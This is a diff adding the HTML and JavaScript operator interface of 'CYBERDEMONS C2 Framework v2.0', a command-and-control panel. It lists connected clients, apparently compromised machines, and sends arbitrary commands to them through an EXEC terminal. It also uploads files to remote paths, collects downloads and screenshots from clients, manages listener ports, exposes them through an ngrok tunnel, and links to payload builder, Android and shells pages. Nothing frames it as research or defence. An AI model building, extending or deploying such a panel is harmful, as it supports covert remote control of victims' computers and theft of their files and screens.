@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="theme-color" content="#0a0a0f">
+<title>CYBERDEMONS C2</title>
+<style>
+:root {
+  --cyan: #00fff0; --magenta: #ff00ff; --green: #39ff14;
+  --red: #ff0040; --yellow: #ffea00; --bg: #0a0a0f;
+  --surface: #0d0d1a; --card: #111122; --border: #1a1a3a;
+  --dim: #6a6a8a; --bright: #e0e0ff;
+  --safe-b: env(safe-area-inset-bottom,0px); --safe-t: env(safe-area-inset-top,0px);
+}
+* { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+html,body { height: 100%; overflow: hidden; }
+body {
+  font-family: 'JetBrains Mono','Cascadia Code','Fira Code',monospace;
+  background: var(--bg); color: var(--bright);
+  display: flex; flex-direction: column; position: relative;
+}
+body::before {
+  content: ''; position: fixed; inset: 0;
+  background: linear-gradient(rgba(0,255,240,.03) 1px,transparent 1px),
+              linear-gradient(90deg,rgba(0,255,240,.03) 1px,transparent 1px);
+  background-size: 40px 40px; pointer-events: none; z-index: 0;
+}
+/* splash */
+#splash {
+  position: fixed; inset: 0; z-index: 9999;
+  background: #050508; display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  transition: opacity .5s,transform .5s;
+}
+#splash.hidden { opacity: 0; transform: scale(1.05); pointer-events: none; }
+.sl { width: 90px; height: 90px; border: 2px solid var(--cyan); border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 38px; font-weight: 900; color: var(--cyan);
+  font-family: 'Orbitron',monospace;
+  box-shadow: 0 0 20px rgba(0,255,240,.3); margin-bottom: 16px;
+  animation: sg 2s infinite; overflow: hidden;
+}
+.sl img { width:100%; height:100%; object-fit:cover; border-radius:50%; }
+@keyframes sg { 0%,100% { box-shadow: 0 0 20px rgba(0,255,240,.3); } 50% { box-shadow: 0 0 40px rgba(0,255,240,.5); } }
+.st { font-family: 'Orbitron',monospace; font-size: 20px; font-weight: 900;
+  color: var(--cyan); text-shadow: 0 0 20px rgba(0,255,240,.3);
+  letter-spacing: 4px; margin-bottom: 4px; }
+.ss { color: var(--magenta); font-size: 9px; letter-spacing: 5px; text-transform: uppercase; }
+.sb { width: 160px; height: 3px; background: rgba(255,255,255,.05);
+  border-radius: 2px; overflow: hidden; margin-top: 16px; }
+.sbi { height: 100%; width: 0; background: linear-gradient(90deg,var(--cyan),var(--magenta)); transition: width .3s; }
+/* header */
+.hdr {
+  padding: 10px 14px; padding-top: max(10px,var(--safe-t));
+  background: var(--surface); border-bottom: 1px solid var(--border);
+  display: flex; align-items: center; gap: 8px;
+  flex-shrink: 0; position: relative; z-index: 10;
+}
+.hdr-logo { width:26px; height:26px; border-radius:50%; border:1px solid var(--cyan); flex-shrink:0; overflow:hidden; display:flex; align-items:center; justify-content:center; font-size:12px; color:var(--cyan); box-shadow:0 0 8px rgba(0,255,240,.2); }
+.hdr-logo img { width:100%; height:100%; object-fit:cover; border-radius:50%; }
+.hl {
+  font-family: 'Orbitron',monospace; font-size: 13px;
+  font-weight: 900; color: var(--cyan); letter-spacing: 2px;
+}
+.hl span { color: var(--magenta); }
+.hs { margin-left: auto; display: flex; align-items: center; gap: 6px; font-size: 9px; color: var(--dim); }
+.hs .d { width: 6px; height: 6px; border-radius: 50%; }
+.hs .d.on { background: var(--green); box-shadow: 0 0 6px var(--green); }
+.hs .d.off { background: var(--dim); }
+/* panels */
+#app { flex: 1; overflow: hidden; position: relative; z-index: 1; }
+.panels { display: flex; height: 100%; transition: transform .3s cubic-bezier(.4,0,.2,1); }
+.panel { min-width: 100%; height: 100%; overflow-y: auto; -webkit-overflow-scrolling: touch; }
+.panel::-webkit-scrollbar { width: 3px; }
+.panel::-webkit-scrollbar-thumb { background: var(--cyan); border-radius: 2px; }
+/* bottom nav */
+.nav {
+  display: flex; background: var(--surface);
+  border-top: 1px solid var(--border); flex-shrink: 0;
+  padding-bottom: var(--safe-b); position: relative; z-index: 10;
+}
+.ni {
+  flex: 1; text-align: center; padding: 5px 4px 3px; cursor: pointer;
+  color: var(--dim); transition: all .2s; user-select: none;
+}
+.ni .ic { font-size: 18px; display: block; }
+.ni .lb { font-size: 7px; text-transform: uppercase; letter-spacing: .5px; margin-top: -1px; }
+.ni.on { color: var(--cyan); }
+.ni.on::before { content: ''; position: absolute; top: -1px; left: 25%; right: 25%; height: 2px; background: var(--cyan); border-radius: 0 0 2px 2px; }
+/* shared */
+.cd {
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: 10px; padding: 12px; margin: 8px 10px;
+  position: relative; overflow: hidden;
+}
+.cd::before { content: ''; position: absolute; top: -1px; left: 20%; right: 20%; height: 1px; background: linear-gradient(90deg,transparent,var(--cyan),transparent); opacity: .4; }
+.ct { font-size: 9px; text-transform: uppercase; letter-spacing: 1.5px; color: var(--dim); margin-bottom: 8px; }
+.btn {
+  display: inline-flex; align-items: center; justify-content: center;
+  padding: 10px 20px; border-radius: 8px; border: none;
+  background: linear-gradient(135deg,rgba(255,255,255,.06),rgba(255,255,255,.02));
+  color: var(--bright); font-family: inherit;
+  font-size: 11px; cursor: pointer; transition: all .2s;
+  text-decoration: none; gap: 4px; font-weight: 700;
+  box-shadow: 0 2px 8px rgba(0,0,0,.3);
+}
+.btn:active { transform: scale(.95); opacity: .8; }
+.btn-c { background: linear-gradient(135deg,#00fff0,#009b94); color: #000; box-shadow: 0 0 16px rgba(0,255,240,.35); }
+.btn-c:active { box-shadow: 0 0 24px rgba(0,255,240,.5); }
+.btn-g { background: linear-gradient(135deg,#39ff14,#1a8a00); color: #000; box-shadow: 0 0 16px rgba(57,255,20,.35); }
+.btn-g:active { box-shadow: 0 0 24px rgba(57,255,20,.5); }
+.btn-r { background: linear-gradient(135deg,#ff0040,#990026); color: #fff; box-shadow: 0 0 16px rgba(255,0,64,.35); }
+.btn-r:active { box-shadow: 0 0 24px rgba(255,0,64,.5); }
+.btn-y { background: linear-gradient(135deg,#ffea00,#b38a00); color: #000; box-shadow: 0 0 16px rgba(255,234,0,.35); }
+.btn-fw { width: 100%; justify-content: center; }
+.btn-sm { padding: 7px 14px; font-size: 9px; border-radius: 6px; }
+.btn-m { padding: 9px 16px; font-size: 10px; border-radius: 7px; }
+input,select {
+  font-family: inherit; outline: none;
+}
+/* client items */
+.ci {
+  display: flex; align-items: center; gap: 8px; padding: 9px 10px;
+  margin-bottom: 4px; background: var(--card); border-radius: 8px;
+  border: 1px solid transparent; cursor: pointer; transition: all .2s;
+}
+.ci:active { border-color: var(--cyan); background: rgba(0,255,240,.05); }
+.ci .d { width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0; }
+.ci .d.on { background: var(--green); box-shadow: 0 0 6px var(--green); }
+.ci .d.off { background: var(--dim); }
+.ci .i { flex: 1; min-width: 0; }
+.ci .i .a { font-size: 11px; font-weight: 700; }
+.ci .i .m { font-size: 8px; color: var(--dim); margin-top: 1px; }
+/* terminal */
+.term {
+  background: rgba(0,0,0,.5); border-radius: 8px;
+  padding: 10px; min-height: 120px; max-height: 50vh;
+  overflow-y: auto; font-size: 10px; line-height: 1.5;
+}
+.term .l { white-space: pre-wrap; word-break: break-all; padding: 1px 0; }
+.term .l.c { color: var(--cyan); }
+.term .l.c::before { content: '> '; color: var(--magenta); }
+.term .l.r { color: var(--bright); }
+.term .l.s { color: var(--dim); font-style: italic; }
+.term .l.e { color: var(--red); }
+.term .l.f { color: var(--green); font-size: 9px; }
+.tr {
+  display: flex; gap: 6px; margin-top: 6px;
+}
+.tr input {
+  flex: 1; background: rgba(0,0,0,.5); border: 1px solid var(--border);
+  border-radius: 8px; padding: 10px 12px; color: var(--bright);
+  font-size: 13px;
+}
+.tr input:focus { border-color: var(--cyan); }
+.tr button {
+  border: none; border-radius: 8px;
+  padding: 10px 18px; font-family: inherit;
+  font-size: 11px; cursor: pointer; font-weight: 700;
+  background: linear-gradient(135deg,#00fff0,#009b94); color: #000;
+  box-shadow: 0 0 14px rgba(0,255,240,.3);
+  transition: all .2s;
+}
+.tr button:active { transform: scale(.95); box-shadow: 0 0 22px rgba(0,255,240,.5); }
+.tr button:disabled { opacity: .35; transform: none; box-shadow: none; }
+/* files */
+.fc { margin-bottom: 12px; }
+.fc h4 { font-size: 9px; color: var(--dim); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px; }
+.fc h4 span { color: var(--cyan); }
+.fg { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; }
+.fi {
+  background: var(--card); border: 1px solid var(--border); border-radius: 6px;
+  padding: 8px 10px; display: flex; align-items: center; gap: 6px;
+}
+.fi .fn { flex:1; min-width:0; font-size:10px; word-break:break-all; }
+.fi .fs { font-size:8px; color:var(--dim); white-space:nowrap; }
+.fi a { color:#000; font-size:9px; text-decoration:none; padding:4px 10px; border-radius:4px; font-weight:700; background:linear-gradient(135deg,#00fff0,#009b94); box-shadow:0 0 8px rgba(0,255,240,.25); transition:all .2s; }
+.fi a:active { transform:scale(.93); box-shadow:0 0 14px rgba(0,255,240,.4); }
+/* history */
+.hi {
+  padding:6px 0; border-bottom:1px solid rgba(255,255,255,.03);
+  font-size:11px; display:flex; gap:8px;
+}
+.hi .t { color:var(--dim); font-size:9px; white-space:nowrap; padding-top:1px; }
+.hi .c { color:var(--cyan); word-break:break-all; }
+.hi .c::before { content:'> '; color:var(--magenta); }
+/* empty */
+.emp { padding: 24px 10px; text-align: center; color: var(--dim); font-size: 11px; }
+.emp .b { font-size: 32px; opacity: .3; margin-bottom: 6px; }
+/* listener item */
+.li { display:flex; align-items:center; gap:6px; padding:7px 10px; font-size:10px; border-bottom:1px solid rgba(255,255,255,.03); }
+.li .d { width:6px; height:6px; border-radius:50%; flex-shrink:0; }
+.li .d.on { background:var(--green); box-shadow:0 0 6px var(--green); }
+.li .d.off { background:var(--dim); }
+.li .pn { margin-right:auto; }
+#fileInput { display:none; }
+body.has-bg::before { display: none; }
+</style>
+</head>
+<body>
+<div id="splash">
+  <div class="sl" id="splashLogoEl">&#9881;</div>
+  <div class="st">CYBERDEMONS</div>
+  <div class="ss">C2 Framework v2.0</div>
+  <div class="sb"><div class="sbi" id="sbar"></div></div>
+</div>
+
+<div class="hdr">
+  <div class="hdr-logo" id="hdrLogoEl">&#9881;</div>
+  <div class="hl">CYBER<span>DEMONS</span></div>
+  <div class="hs">
+    <span class="d off" id="hd"></span>
+    <span id="ht">Idle</span>
+  </div>
+</div>
+
+<div id="app">
+  <div class="panels" id="panels">
+    <!-- Clients -->
+    <div class="panel" id="p-clients" style="padding-bottom:60px;">
+      <div class="cd"><div class="ct">&#128279; Clients</div><div id="cl"></div></div>
+      <div class="cd"><div class="ct">&#128264; Listeners</div>
+        <div style="display:flex;gap:6px;margin-bottom:6px;">
+          <input type="number" id="np" placeholder="port" style="flex:1;background:rgba(0,0,0,.4);border:1px solid var(--border);border-radius:8px;padding:8px 10px;color:var(--bright);font-size:12px;">
+          <button class="btn btn-c btn-sm" onclick="addL()">+Add</button>
+        </div>
+        <div id="ll"></div>
+      </div>
+      <div class="cd"><div class="ct">&#128268; Ngrok Tunnel</div>
+        <div style="display:flex;gap:6px;margin-bottom:6px;">
+          <input type="number" id="ngPort" value="7777" placeholder="port" style="flex:1;background:rgba(0,0,0,.4);border:1px solid var(--border);border-radius:8px;padding:8px 10px;color:var(--bright);font-size:12px;">
+          <button class="btn btn-c btn-sm" id="ngBtn" onclick="ngStart()">Start</button>
+          <button class="btn btn-r btn-sm" id="ngStopBtn" onclick="ngStop()" style="display:none;">Stop</button>
+        </div>
+        <div id="ngStatus" style="font-size:9px;color:var(--dim);">Not running</div>
+        <div id="ngUrl" style="font-size:11px;color:var(--green);margin-top:4px;display:none;"></div>
+      </div>
+      <div style="display:flex;gap:6px;padding:0 10px 8px;">
+        <a href="/builder" class="btn btn-c btn-sm" style="flex:1;">&#9881; Builder</a>
+        <a href="/android" class="btn btn-g btn-sm" style="flex:1;">&#128241; Android</a>
+        <a href="/shells" class="btn btn-r btn-sm" style="flex:1;">&#9760; Shells</a>
+      </div>
+    </div>
+    <!-- Terminal -->
+    <div class="panel" id="p-term" style="padding-bottom:60px;">
+      <div class="cd">
+        <div class="ct" style="display:flex;justify-content:space-between;">
+          <span>&#9000; Terminal</span>
+          <span id="tc" style="color:var(--dim);font-size:8px;">no client</span>
+        </div>
+        <div class="term" id="to"><div class="emp"><div class="b">&#9000;</div>Select a client</div></div>
+        <div class="tr">
+          <input type="text" id="ci" placeholder="command..." disabled>
+          <button id="sb" disabled onclick="send()">EXEC</button>
+        </div>
+      </div>
+      <div style="display:flex;gap:6px;padding:0 10px;">
+        <button class="btn btn-r btn-sm" style="flex:1;" onclick="clearT()">Clear</button>
+        <button class="btn btn-sm btn-c" style="flex:1;" id="ub" disabled onclick="upf()">Upload</button>
+      </div>
+    </div>
+    <!-- Files -->
+    <div class="panel" id="p-files" style="padding-bottom:60px;">
+      <div class="cd"><div class="ct">&#128193; Files</div><div id="fp"><div class="emp"><div class="b">&#128193;</div>Select a client</div></div></div>
+    </div>
+    <!-- History -->
+    <div class="panel" id="p-hist" style="padding-bottom:60px;">
+      <div class="cd"><div class="ct">&#128214; History</div><div id="hp"><div class="emp"><div class="b">&#128214;</div>Select a client</div></div></div>
+    </div>
+  </div>
+</div>
+
+<div class="nav" id="bn">
+  <div class="ni on" data-p="clients" onclick="sw('clients')">
+    <span class="ic">&#128279;</span><span class="lb">Clients</span>
+  </div>
+  <div class="ni" data-p="terminal" onclick="sw('terminal')">
+    <span class="ic">&#9000;</span><span class="lb">Terminal</span>
+  </div>
+  <div class="ni" data-p="files" onclick="sw('files')">
+    <span class="ic">&#128193;</span><span class="lb">Files</span>
+  </div>
+  <div class="ni" data-p="history" onclick="sw('history')">
+    <span class="ic">&#128214;</span><span class="lb">History</span>
+  </div>
+</div>
+
+<input type="file" id="fileInput" onchange="ufs()">
+
+<script>
+const _pages = ['clients','terminal','files','history'];
+let sel = null, pt = {}, cp = 'clients', cc = 0, st = Date.now();
+
+// splash
+(async()=>{
+  const b = document.getElementById('sbar');
+  for (const ms of [200,250,200,250]) { await new Promise(r=>setTimeout(r,ms)); b.style.width = (parseInt(b.style.width||0)+25)+'%'; }
+  await new Promise(r=>setTimeout(r,400));
+  document.getElementById('splash').classList.add('hidden');
+  setTimeout(()=>document.getElementById('splash').style.display='none',500);
+})();
+
+// swipe
+(function(){
+  let sx=0,sy=0, mv=false;
+  document.getElementById('app').addEventListener('touchstart',e=>{sx=e.touches[0].clientX;sy=e.touches[0].clientY;mv=false;},{passive:true});
+  document.getElementById('app').addEventListener('touchmove',e=>{const dx=e.touches[0].clientX-sx,dy=e.touches[0].clientY-sy;if(Math.abs(dx)>Math.abs(dy)&&Math.abs(dx)>30)mv=true;},{passive:true});
+  document.getElementById('app').addEventListener('touchend',e=>{
+    if(!mv)return; const dx=e.changedTouches[0].clientX-sx;
+    if(Math.abs(dx)<40)return; const i=_pages.indexOf(cp);
+    if(dx<0&&i<_pages.length-1) sw(_pages[i+1]);
+    else if(dx>0&&i>0) sw(_pages[i-1]);
+    mv=false;
+  },{passive:true});
+})();
+
+function sw(p) {
+  cp = p; const i = _pages.indexOf(p);
+  document.getElementById('panels').style.transform = `translateX(-${i*100}%)`;
+  document.querySelectorAll('.ni').forEach(n=>n.classList.toggle('on',n.dataset.p===p));
+  if (p==='files'&&sel) pf(sel);
+  if (p==='history'&&sel) ph(sel);
+}
+
+async function api(url,opts) { try { const r=await fetch(url,opts); return await r.json(); } catch { return null; } }
+
+// status
+setInterval(async()=>{
+  const d=await api('/api/clients'); if(!d)return;
+  const e=Object.values(d), on=e.filter(c=>c.connected).length;
+  document.getElementById('hd').className='d '+(on?'on':'off');
+  document.getElementById('ht').textContent=on?`${on} online`:'Idle';
+},3000);
+
+// clients
+async function rc() {
+  const d=await api('/api/clients'); if(!d)return;
+  const e=Object.values(d); const l=document.getElementById('cl');
+  if(!e.length){l.innerHTML='<div class="emp"><div class="b">&#9881;</div>No connections</div>';return;}
+  l.innerHTML=e.map(c=>{
+    const st=c.connected?'on':'off', ago=c.last_seen?Math.floor((Date.now()/1000-c.last_seen))+'s':'--';
+    return `<div class="ci" onclick="sc('${c.id}')"><span class="d ${st}"></span><div class="i"><div class="a">${c.addr}</div><div class="m">${st.toUpperCase()} &middot; ${c.output_count} resp &middot; ${ago}</div></div></div>`;
+  }).join('');
+}
+setInterval(rc,2500);
+
+function sc(id) {
+  sel=id; document.getElementById('tc').textContent=`[ ${id} ]`;
+  document.getElementById('ci').disabled=false; document.getElementById('sb').disabled=false;
+  document.getElementById('ub').disabled=false;
+  document.getElementById('to').innerHTML=''; document.getElementById('to').dataset.count=0;
+  for(const k in pt) clearInterval(pt[k]); pt={};
+  pt.t=setInterval(()=>ptf(id),500); pt.f=setInterval(()=>{if(cp==='files')pf(id);},3000);
+  pt.h=setInterval(()=>{if(cp==='history')ph(id);},5000);
+  document.getElementById('ci').focus(); sw('terminal');
+}
+
+// terminal
+async function ptf(id) {
+  const o=document.getElementById('to');
+  const d=await api(`/api/poll/${id}?since=${o.dataset.count||0}`);
+  if(!d)return; o.dataset.count=d.count;
+  for(const i of d.output){
+    const div=document.createElement('div');
+    div.className='l '+(i.type==='command'?'c':'r');
+    div.textContent=i.data; o.appendChild(div);
+    if(i.type==='command') cc++;
+  }
+  if(d.files) for(const f of d.files){
+    const div=document.createElement('div');
+    div.className='l s'; div.innerHTML=`[${f.type}] ${f.file}`;
+    o.appendChild(div);
+  }
+  if(!d.connected&&id===sel){const div=document.createElement('div');div.className='l e';div.textContent='[-] Disconnected';o.appendChild(div);}
+  o.scrollTop=o.scrollHeight;
+}
+async function send(){
+  const i=document.getElementById('ci'),c=i.value.trim();
+  if(!c||!sel)return; i.value='';
+  await api('/api/command',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({client_id:sel,command:c})});
+}
+document.getElementById('ci').addEventListener('keydown',e=>{if(e.key==='Enter')send();});
+function clearT(){const o=document.getElementById('to');o.innerHTML='';o.dataset.count=0;if(sel)api('/api/clear/'+sel,{method:'POST'});}
+
+// upload
+function upf(){if(sel)document.getElementById('fileInput').click();}
+async function ufs(){
+  const fi=document.getElementById('fileInput'),f=fi.files[0]; if(!f)return;
+  const r=prompt('Remote path:',f.name); if(!r)return;
+  const fd=new FormData();fd.append('file',f);fd.append('client_id',sel);fd.append('remote_path',r);
+  fi.value=''; const d=await api('/api/upload/file',{method:'POST',body:fd});
+  if(d&&d.error)alert('Upload failed: '+d.error);
+  else if(d&&d.sent)alert('Sent: '+d.file+' ('+d.size+' bytes) to '+d.remote);
+}
+
+// files
+async function pf(id){
+  const d=await api(`/api/client/${id}/files`); if(!d)return;
+  const p=document.getElementById('fp');
+  const cats=['downloads','screenshots','uploads'], labels={downloads:'Downloads',screenshots:'Screenshots',uploads:'Uploads'}, icons={downloads:'&#8681;',screenshots:'&#128247;',uploads:'&#128228;'};
+  let html='';
+  for(const cat of cats){
+    const items=d[cat]||[];
+    html+=`<div class="fc"><h4>${icons[cat]} ${labels[cat]} <span>(${items.length})</span></h4><div class="fg">`;
+    if(!items.length) html+='<div style="color:var(--dim);font-size:10px;padding:4px;">No files</div>';
+    else for(const f of items){
+      const sz=f.size>1048576?(f.size/1048576).toFixed(1)+'MB':f.size>1024?(f.size/1024).toFixed(1)+'KB':f.size+'B';
+      html+=`<div class="fi"><div class="fn">${f.name}</div><div class="fs">${sz}</div><a href="/files/${f.path}" target="_blank">DL</a></div>`;
+    }
+    html+=`</div></div>`;
+  }
+  p.innerHTML=html;
+}
+
+// history
+async function ph(id){
+  const d=await api(`/api/client/${id}/history`); if(!d)return;
+  const p=document.getElementById('hp');
+  if(!d.length){p.innerHTML='<div class="emp"><div class="b">&#128214;</div>No commands</div>';return;}
+  p.innerHTML=d.slice().reverse().map(h=>`<div class="hi"><span class="t">${h.time}</span><span class="c">${h.cmd}</span></div>`).join('');
+}
+
+// listeners
+setInterval(async()=>{
+  const d=await api('/api/listeners'); if(!d)return;
+  const l=document.getElementById('ll');
+  if(!d.length){l.innerHTML='<div style="padding:6px;color:var(--dim);font-size:9px;">No listeners</div>';return;}
+  l.innerHTML=d.map(x=>{
+    const st=x.running?'on':'off';
+    return `<div class="li"><span class="d ${st}"></span><span class="pn">Port ${x.port}</span><button class="btn btn-sm" style="padding:3px 8px;font-size:8px;" onclick="tl(${x.port})">${x.enabled?'OFF':'ON'}</button><button class="btn btn-sm" style="padding:3px 8px;font-size:8px;border-color:var(--red);color:var(--red);" onclick="rl(${x.port})">X</button></div>`;
+  }).join('');
+},3000);
+
+async function addL(){const i=document.getElementById('np'),p=parseInt(i.value);if(!p||p<1||p>65535)return;i.value='';await api('/api/listeners/add',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({port:p})});}
+async function tl(p){await api(`/api/listeners/${p}/toggle`,{method:'POST'});}
+async function rl(p){if(!confirm(`Remove port ${p}?`))return;await api(`/api/listeners/${p}`,{method:'DELETE'});}
+
+// ngrok
+let ngPoll=null;
+async function ngStart(){
+  const port=parseInt(document.getElementById('ngPort').value)||7777;
+  const d=await api('/api/ngrok/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({port})});
+  if(d&&d.error){document.getElementById('ngStatus').textContent='Error: '+d.error;return;}
+  document.getElementById('ngStatus').textContent='Starting...';
+  document.getElementById('ngBtn').style.display='none';document.getElementById('ngStopBtn').style.display='inline';
+  ngPoll=setInterval(ngStatus,2000);
+  ngStatus();
+}
+async function ngStop(){
+  await api('/api/ngrok/stop',{method:'POST'});
+  if(ngPoll){clearInterval(ngPoll);ngPoll=null;}
+  document.getElementById('ngStatus').textContent='Not running';
+  document.getElementById('ngUrl').style.display='none';
+  document.getElementById('ngBtn').style.display='inline';document.getElementById('ngStopBtn').style.display='none';
+}
+async function ngStatus(){
+  const d=await api('/api/ngrok/status');
+  if(!d)return;
+  if(d.running&&d.host){
+    document.getElementById('ngStatus').textContent='Running';
+    document.getElementById('ngUrl').style.display='block';
+    document.getElementById('ngUrl').textContent=d.tunnel;
+    if(ngPoll){clearInterval(ngPoll);ngPoll=null;}
+  }else if(d.running){
+    document.getElementById('ngStatus').textContent='Connecting...';
+  }else{
+    if(document.getElementById('ngBtn').style.display==='none') ngStop();
+  }
+}
+setInterval(async()=>{
+  const d=await api('/api/ngrok/status');
+  if(d&&d.running&&d.host){document.getElementById('ngStatus').textContent='Running';document.getElementById('ngUrl').style.display='block';document.getElementById('ngUrl').textContent=d.tunnel;}
+},10000);
+
+// bg + logo
+async function loadAssets(){
+  const d=await api('/api/settings');
+  if(!d)return;
+  if(d.bg){document.body.style.backgroundImage=`url(${d.bg}?t=${Date.now()})`;document.body.style.backgroundSize='cover';document.body.style.backgroundPosition='center';document.body.style.backgroundAttachment='fixed';document.body.classList.add('has-bg');}
+  if(d.logo){const html=`<img src="${d.logo}?t=${Date.now()}" alt="logo">`;document.getElementById('splashLogoEl').innerHTML=html;document.getElementById('hdrLogoEl').innerHTML=html;}
+}
+loadAssets();
+
+// init
+rc();
+</script>
+</body>
+</html>
